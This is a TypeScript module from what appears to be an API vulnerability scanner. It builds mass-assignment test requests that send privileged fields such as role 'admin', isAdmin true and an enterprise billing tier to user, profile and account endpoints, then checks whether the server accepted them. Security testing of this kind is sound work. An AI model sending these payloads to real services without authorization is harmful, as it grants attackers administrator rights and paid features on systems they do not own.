import { DiscoveredEndpoint, ExploitCandidate } from '../types.js';
import { buildSessionHeaders } from './idor_striker.js';

export interface MassAssignmentPayloadConfig {
  privilegedKeys?: Record<string, unknown>;
  sessionHeaders?: Record<string, string>;
}

/**
 * MASS ASSIGNMENT STRIKER (OWASP API3:2023 - BOPLA)
 * Tests whether PUT/PATCH endpoints bind privileged model properties without whitelisting.
 */
export class MassAssignmentStriker {
  private static readonly DEFAULT_PRIVILEGED_PROPERTIES: Record<string, unknown> = {
    role: 'admin',
    isAdmin: true,
    is_admin: true,
    verified: true,
    is_verified: true,
    billingTier: 'enterprise',
  };

  /**
   * Generates mass assignment candidates for state-mutating endpoints.
   */
  public static generateCandidates(
    endpoint: DiscoveredEndpoint,
    baseUrl: string,
    authToken: string,
    targetResourceId: string,
    config: MassAssignmentPayloadConfig = {}
  ): ExploitCandidate[] {
    // Only test state-modifying requests
    if (endpoint.method !== 'PUT' && endpoint.method !== 'PATCH' && endpoint.method !== 'POST') {
      return [];
    }

    // Must be a user, profile, account, or role endpoint
    const isProfileTarget = /(user|profile|account|member|setting|org)/i.test(endpoint.path);
    if (!isProfileTarget) {
      return [];
    }

    const privilegedPayload = {
      ...this.DEFAULT_PRIVILEGED_PROPERTIES,
      ...(config.privilegedKeys || {}),
    };

    let resolvedPath = endpoint.path.replace(/\{[a-zA-Z0-9_]+\}/g, targetResourceId);
    resolvedPath = resolvedPath.replace(/:[a-zA-Z0-9_]+/g, targetResourceId);
    const fullUrl = `${baseUrl.replace(/\/$/, '')}/${resolvedPath.replace(/^\//, '')}`;

    return [
      {
        vector: 'MASS_ASSIGNMENT_VIOLATION',
        targetUrl: fullUrl,
        method: endpoint.method,
        headers: buildSessionHeaders(authToken, config.sessionHeaders, {
          'Content-Type': 'application/json',
        }),
        body: JSON.stringify(privilegedPayload),
        expectedLeakFragment: '"role":"admin"',
      },
    ];
  }
}
